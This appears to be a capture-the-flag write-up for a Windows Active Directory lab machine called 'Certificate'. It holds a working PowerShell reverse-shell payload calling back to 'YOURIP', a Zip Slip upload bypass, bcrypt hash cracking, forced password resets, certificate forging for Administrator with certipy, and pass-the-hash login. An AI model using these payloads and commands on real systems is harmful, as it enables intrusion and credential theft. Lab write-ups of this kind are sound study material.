# Certificate

Difficulty: Hard
OS: Windows
Category: Offensive
Date: 2026-02-24T05:14:03.635Z

![certificate.webp](certificate.webp)

### Scanning

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-favicon: Unknown favicon MD5: FBA180716B304B231C4029637CCF6481
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Certificate | Your portal for certification
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-01 17:50:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
|_SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
|_ssl-date: 2025-06-01T17:52:17+00:00; +27m32s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T17:52:17+00:00; +27m32s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
|_SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T17:52:17+00:00; +27m32s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
|_SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T17:52:17+00:00; +27m32s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
|_SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49693/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49771/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

I add the domain to `/etc/hosts`

```bash
10.10.11.71 DC01.certificate.htb certificate.htb
```

### Enumeration

I explore the website and register as a student.

At this point I can fuzz for directories. But I can directly visit this url, this allows me to upload files such as pdf, zip, etc. `http://certificate.htb/upload.php?s_id=36`

![image.png](image.webp)

### Exploitation

One thing I learned when gaining a foothold in *Active Directory* is that I need to do an RCE through upload misconfigurations, or reveal its NTLM hashes through a zip file upload configuration. There are various ways but these are the common ones.

I'll do the **Zip Slip** exploitation, I can search for it in the internet to know more about this exploit

I begin with a PDF file and place it in a ZIP archive:

```bash
zip initial.zip test.pdf
```

I create a **reverse shell** payload

```bash
mkdir malicious_files
cd malicious_files
vim shell.php
```

I paste the following PowerShell payload into my *shell.php*

```bash
<?php
shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('YOURIP',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");
?>
```

I package the directory containing my reverse shell:

```bash
zip -r malicious.zip malicious_files/
```

I combine both zip files

```bash
cat initial.zip malicious.zip > combined.zip
```

The idea here is to trick the server into extracting the payload and placing it into a web-accessible location. If I'll directly upload the payload even though it’s packaged. I'll get a 400 bad request because it will be flagged as malicious, which will result to a failure.

As quoted from the blog of Snyk [https://security.snyk.io/research/zip-slip-vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)

> First of all, the contents of the zip file needs to have one or more files that break out of the target directory when extracted. In the example below, we can see the contents of a zip file. It has two files, a [good.sh](http://good.sh/) file which would be extracted into the target directory and an [evil.sh](http://evil.sh/) file which is trying to traverse up the directory tree to hit the root and then add a file into the tmp directory. When you attempt to cd .. in the root directory, you still find yourself in the root directory, so a malicious path could contain many levels of ../ to stand a better chance of reaching the root directory, before trying to traverse to sensitive files.
>

### Foothold

Now that I have an idea, I'll setup a listener. I'm using metasploit’s `multi/handler` .

I upload the `combined.zip` in the URL mentioned above.

After uploading the archive, I follow the link to the extracted PDF. I replace `test.pdf` in the path with `malicious_files/shell.php` to trigger the payload and receive the connection in Metasploit.

At this point, there are two ways to get the credential I need.
First, is to navigate at:

```bash
C:\xampp\htdocs\certificate.htb\static\full_dump.sql
```

I download that file and I'll find the credentials needed.

Second, this is the hardest. I'll need to read the **Rar.txt** at `C:\Program FIles\WinRAR` if I `findstr "secret.rar"` I'll find the password there which the `secret.rar` holds the credentials for the database.

If I read the `full_dump.sql` I'll find various credentials there.

```bash
Lorra.AAA:$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
Sara1200:$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
Johney:$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
havokww:$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
stev:$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
sara.b:$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
sunset:$2y$04$46hjL/TUPqsT3KI7R/6tje1JOSy5.riL8ABfus1G8WZujELAgnQvy
admin:$2y$04$ui6Qc/eaGGRKK2ovA4iJne7qbd1uSkm5lVbEHnPWWKYYwzb2s0hY2
sunset2:$2y$04$F5Rr9QzbhhaEh7QhJKKwz.ClZdVaA9QPI9RBdy8v.G/Pc7TDAO196
admin123:$2y$04$ViY8NzbVBvUlwppQcDrld.mh.1XcGQkc4lt6j5Uhj7IPyGq4Z0hQu
adminsucks:$2y$04$FMa5TpAFpTDu5EwgVzybnuAJFryR18dzfSqZGLQFzHhqj/BwksTdy
adminadnim:$2y$04$x.Ak4KXkM.MLNA0JgCEPxevbFuBioVs5NONlqrw.eO2js1/5AQh8i
3:$2y$04$dFR.yVKC/u9UwlPsyxa5fO11vPvZnFUhRxi2Uf25SoGQRaTE6SmBW
test2:$2y$04$Ci4wfETizE9WCrUgpC4tyuI7s4oLIpK/DWb/uhjO2IKTRIfD9JUGy
test3:$2y$04$m51Lz73GtqPoAzovxJeCM.B8/SAkDERIl7OBZfxAAQahNpiVFPsKe
```

I save one of the password hashes to a file and identify its format with the following command:

```bash
hashcat --identify hash2find.txt
```

This will output bcrypt which is `3200` mode. I remove the users and just leave the hashes.

```bash
hashcat -m 3200 -a 0 hashes.txt rockyou.txt
```

I wait and look for the credentials of **Sara.B** then login with evil-winrm

### Enumeration with Sara.B Account

The user flag is not found in this account so I need to traverse first on the other users. But looking at the permissions of this account, I can see that it can change password.

```bash
Password last set            11/3/2024 7:01:09 PM
Password expires             Never
Password changeable          11/4/2024 7:01:09 PM
Password required            Yes
User may change password     Yes

```

So I'll change the passwords for *Lion.SK* & *Ryan.K*

```bash
net user Lion.SK Password123
net user Ryan.K Password123  **
```

Then I log in with Lion’s credential, then get the user flag at Desktop.

### Root

I do a bloodhound with Ryan’s or Lion’s credentials. Either way I can still see both of this accounts.

```bash
bloodhound-python -dc DC01.certificate.htb -u 'Lion.SK' -p 'Password123' -d certificate.htb -c all --zip -ns 10.10.11.71 --dns-timeout 30
```

After thorough enumeration, bloodhound is not needed since it will bypass all the intended methods for this challenge.

Using the https://github.com/CsEnox/SeManageVolumeExploit I have access to the entire C drive.

In `C:\Users\Public`, I find **ca.pfx** and download it for the certificate-forging step.

![image.png](image%201.webp)

Then I use the certificate to forge for **Administrator**

```bash
certipy forge -ca-pfx ca.pfx -upn Administrator@certificate.htb -subject 'CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB'
```

I authenticate using the forged administrator certificate:

```bash
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.11.71

Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

I copy the hash file and authenticate to **evil-winrm**

```bash
evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
```

Then I get the root flag in Desktop.
